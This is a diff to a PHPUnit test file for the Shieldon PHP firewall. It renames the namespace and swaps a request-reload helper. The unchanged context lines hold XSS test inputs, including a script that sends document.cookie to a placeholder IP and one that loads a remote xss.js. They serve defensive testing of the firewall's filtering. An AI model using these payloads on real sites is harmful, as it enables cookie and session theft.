@@ -20,9 +20,9 @@
 
 declare(strict_types=1);
 
-namespace Shieldon\Firewall\Tests;
+namespace Shieldon\FirewallTest;
 
-class FirewallTest extends \PHPUnit\Framework\TestCase
+class FirewallTest extends \Shieldon\FirewallTest\ShieldonTestCase
 {
     public function testFromJsonConfig()
     {
@@ -74,7 +74,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $_POST['test_one'] = '<script> alert(); </script>';
         $_COOKIE['test_two'] = '<script src="http://19.89.6.4/xss.js">';
         $_GET['test_three'] = '<script>new Image().src="http://19.89.6.4/test.php?output="+document.cookie;</script>';
-        reload_request();
+        $this->refreshRequest();
 
         $firewall->run();
 
@@ -90,7 +90,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $_POST['_test'] = '<script> alert(123); </script>';
         $_COOKIE['_test'] = '<script> alert(123); </script>';
         $_GET['_test'] = '<script> alert(123); </script>';
-        reload_request();
+        $this->refreshRequest();
 
         $firewall->getKernel()->setIp('140.132.72.12');
 
@@ -143,7 +143,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
     public function testIpSourceOption()
     {
         $_SERVER['HTTP_CF_CONNECTING_IP'] = '19.89.6.4';
-        reload_request();
+        $this->refreshRequest();
 
         $this->testFromJsonConfig();
         $firewall = \Shieldon\Firewall\Utils\Container::get('firewall');
@@ -168,7 +168,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $this->assertEquals($firewall->getKernel()->getIp(), '19.89.6.4');
 
         $_SERVER['HTTP_X_FORWARDED_FOR'] = '19.80.4.12';
-        reload_request();
+        $this->refreshRequest();
 
         $this->testFromJsonConfig();
         $firewall = \Shieldon\Firewall\Utils\Container::get('firewall');
@@ -187,7 +187,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
 
         // HTTP_X_FORWARDED_HOST
         $_SERVER['HTTP_X_FORWARDED_HOST'] = '5.20.13.14';
-        reload_request();
+        $this->refreshRequest();
 
         $this->testFromJsonConfig();
         $firewall = \Shieldon\Firewall\Utils\Container::get('firewall');
@@ -333,7 +333,7 @@ class FirewallTest extends \PHPUnit\Framework\TestCase
         $this->assertSame($response->getStatusCode(), 403);
 
         $_POST['shieldon_captcha'] = 'ok';
-        reload_request();
+        $this->refreshRequest();
 
         $firewall->getKernel()->captcha = [];
         $firewall->getKernel()->setCaptcha(new \Shieldon\Firewall\Captcha\Foundation());
